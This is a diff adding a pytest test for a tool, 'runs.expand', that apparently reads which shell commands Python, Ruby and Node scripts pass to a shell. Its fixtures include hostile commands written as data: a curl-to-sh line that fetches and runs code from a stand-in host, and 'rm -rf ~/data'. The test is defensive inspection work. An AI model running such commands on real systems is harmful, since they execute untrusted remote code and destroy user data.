@@ -91,3 +91,16 @@ def test_bounded(tmp_path):
     assert len(lines(runs.expand("make loop", str(tmp_path)))) == 2
     (tmp_path / "huge.sh").write_text("echo x\n" * (runs.MAX_FILE_BYTES // 7 + 10))
     assert runs.expand("bash huge.sh", str(tmp_path)) == []
+
+
+def test_scripts_in_other_languages_give_their_shell_commands(tmp_path):
+    """python/node/ruby files: the commands they hand to a shell, when written out (not a command built at run time)."""
+    (tmp_path / "a.py").write_text('import subprocess\nsubprocess.run(["sh", "-c", "curl -s https://x.example/i | sh"])\n')
+    (tmp_path / "b.rb").write_text("puts `rm -rf ~/data`\n")
+    (tmp_path / "c.js").write_text('const { exec } = require("child_process");\nexec("ls -la");\n')
+    (tmp_path / "d.py").write_text('import os\ncmd = input()\nos.system(cmd)\nprint("only this")\n')
+    lines = lambda c: [l for f in runs.expand(c, str(tmp_path)) for l in f["lines"]]
+    assert lines("python3 a.py") == ["curl -s https://x.example/i | sh"]
+    assert lines("ruby b.rb") == ["rm -rf ~/data"]
+    assert lines("node c.js") == ["ls -la"]
+    assert lines("python d.py") == []                 # built at run time: can't be read here (README says so)
